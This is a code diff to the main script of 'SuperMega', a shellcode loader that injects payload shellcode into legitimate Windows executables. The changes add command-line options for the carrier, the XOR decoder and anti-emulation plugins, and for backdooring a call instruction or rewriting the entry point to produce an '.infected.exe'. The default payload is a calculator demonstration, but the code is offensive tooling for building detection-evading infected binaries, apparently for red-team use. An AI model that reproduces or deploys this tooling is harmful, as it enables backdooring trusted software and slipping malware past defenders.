@@ -26,66 +26,60 @@ def main():
     logger.info("Super Mega")
     config.load()
     check_deps()
-    settings = Settings()
+    settings = Settings("commandline")
 
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
-    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
-    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
-    parser.add_argument('--carrier', type=str, help='carrier name (peb_walk, iat_reuse, ...)')
-    parser.add_argument('--decoder', type=str, help='Template: which decoder plugin')
-    parser.add_argument('--carrier_invoke', type=str, help='Redbackdoorer run argument (1 EAP, 2 hijack)')
+    parser.add_argument('--shellcode', type=str, help='payload shellcode: data/binary/shellcodes/* (messagebox.bin, calc64.bin, ...)', default="calc64.bin")
+    parser.add_argument('--inject', type=str, help='which exe to inject into: data/binary/exes/* (7z.exe, procexp64.exe, ...)', default="procexp64.exe")
+    parser.add_argument('--carrier', type=str, help='carrier: data/source/carrier/* (alloc_rw_rx, peb_walk, ...)', default="alloc_rw_rx")
+    parser.add_argument('--decoder', type=str, help='decoder: data/source/decoders/* (xor_1, xor_2, plain, ...)', default="xor_2")
+    parser.add_argument('--antiemulation', type=str, help='anti-emulation: data/source/antiemulation/* (sirallocalot, timeraw, none, ...)', default="sirallocalot")
+    parser.add_argument('--fix-iat', action='store_true', help='Fix missing IAT entries in the infectable executable', default=True)
+    parser.add_argument('--carrier_invoke', type=str, help='how carrier is started: \"backdoor\" to rewrite call instruction, \"eop\" for entry point', choices=["eop", "backdoor"], default="backdoor")
     parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
     parser.add_argument('--start-loader-shellcode', action='store_true', help='Dev: Start the loader shellcode (without payload)')
     parser.add_argument('--start-final-shellcode', action='store_true', help='Debug: Start the final shellcode (loader + payload)')
-    parser.add_argument('--short-call-patching', action='store_true', help='Make short calls long. You will know when you need it.')
+    parser.add_argument('--short-call-patching', action='store_true', help='Debug: Make short calls long. You will know when you need it.')
     parser.add_argument('--no-clean-at-start', action='store_true', help='Debug: Dont remove any temporary files at start')
     parser.add_argument('--no-clean-at-exit', action='store_true', help='Debug: Dont remove any temporary files at exit')
     parser.add_argument('--show', action='store_true', help='Debug: Show tool output')
+    parser.add_argument('--debug', action='store_true', help='Debug: Show debug output')
     args = parser.parse_args()
 
     if args.show:
         config.ShowCommandOutput = True
+    if args.debug:
+        setup_logging(logging.DEBUG)
+    else:
+        setup_logging(logging.INFO)
+
 
     settings.try_start_final_infected_exe = args.start_injected
     settings.cleanup_files_on_start = not args.no_clean_at_start
     settings.cleanup_files_on_exit =not args.no_clean_at_exit
 
+    # Shellcode: filename
+    # Inject: filename
+    settings.init_payload_injectable(
+        shellcode=FilePath(args.shellcode),
+        injectable=FilePath(args.inject),
+        dll_func="")
+
+    settings.decoder_style = args.decoder
+    settings.carrier_name = args.carrier
+    settings.payload_location = PayloadLocation.CODE  # makes sense
     if args.short_call_patching:
         settings.short_call_patching = True
+    if args.carrier_invoke == "eop":
+        settings.carrier_invoke_style = CarrierInvokeStyle.ChangeEntryPoint
+    elif args.carrier_invoke == "backdoor":
+        settings.carrier_invoke_style = CarrierInvokeStyle.BackdoorCallInstr
+    settings.plugin_antiemulation = args.antiemulation
 
-    if args.carrier:
-        settings.carrier_name = args.carrier
-    if args.decoder:
-        settings.decoder_style = args.decoder
-    if args.inject:
-        if args.carrier_invoke == "eop":
-            settings.carrier_invoke_style = CarrierInvokeStyle.ChangeEntryPoint
-        elif args.carrier_invoke == "backdoor":
-            settings.carrier_invoke_style = CarrierInvokeStyle.BackdoorCallInstr
-        else:
-            logging.error("Invalid carrier_invoke, use: eop, backdoor")
-            return
-
-    if not args.shellcode or not args.inject:
-        logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
-        logger.info(r"Example: .\supermega.py --shellcode .\data\shellcodes\calc64.bin --inject .\data\exes\7z.exe")
-        return 1
-    if args.shellcode:
-        if not os.path.isfile(args.shellcode):
-            logger.info("Could not find: {}".format(args.shellcode))
-            return
-        settings.payload_path = args.shellcode
-    if args.inject:
-        if not os.path.isfile(args.inject):
-            logger.info("Could not find: {}".format(args.inject))
-            return
-        settings.inject_exe_in = args.inject
-        settings.inject_exe_out = FilePath("{}{}".format(
-            settings.main_dir,
-            os.path.basename(args.inject).replace(".exe", ".injected.exe")
-        ))
-        settings.inject_exe_out = args.inject.replace(".exe", ".infected.exe").replace(".dll", ".infected.dll")
-
+    if not os.path.exists(settings.main_dir):
+        logger.info("Creating project directory: {}".format(settings.main_dir))
+        os.makedirs(settings.main_dir)
+    
     write_webproject("default", settings)
     exit_code = start(settings)
     exit(exit_code)
@@ -138,12 +132,15 @@ def sanity_checks(settings):
             raise Exception("loader requires shellcode as payload, not DLL")
 
 
+
 def start_real(settings: Settings):
     """Main entry point for the application. This is where the magic happens (based on settings)"""
 
     # Load our input
     project = Project(settings)
-    project.init()
+    if not project.init():
+        logger.error("Error initializing project")
+        return 1
 
     # CHECK if 64 bit
     if not project.injectable.superpe.is_64():
@@ -238,7 +235,7 @@ def start_real(settings: Settings):
             if payload_exit_code != 0:
                 logger.warning("Payload exit code: {}".format(payload_exit_code))
         elif settings.try_start_final_infected_exe:
-            run_exe(settings.inject_exe_out, dllfunc=settings.dllfunc)
+            run_exe(settings.inject_exe_out, dllfunc=settings.dllfunc, check=False)
 
 
 def obfuscate_shc_loader(file_shc_in, file_shc_out):
@@ -280,8 +277,25 @@ def verify_shellcode(shc_name):
     else:
         logger.error("---> Verify FAIL. Shellcode doesnt work (file was not created)")
         return False
+    
 
+def command_exists(cmd):
+    try:
+        # Use the "where" command to check if the command is in the PATH
+        result = subprocess.run(
+            ["where", cmd],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            shell=True
+        )
+        return result.returncode == 0
+    except Exception:
+        return False
+    
 
 if __name__ == "__main__":
-    setup_logging()
+    if not command_exists("cl.exe"):
+        logger.error("cl.exe not found in PATH. Please install Visual Studio Build Tools.")
+        logger.error("And start this in Developer Command prompt.")
+        exit(1)
     main()
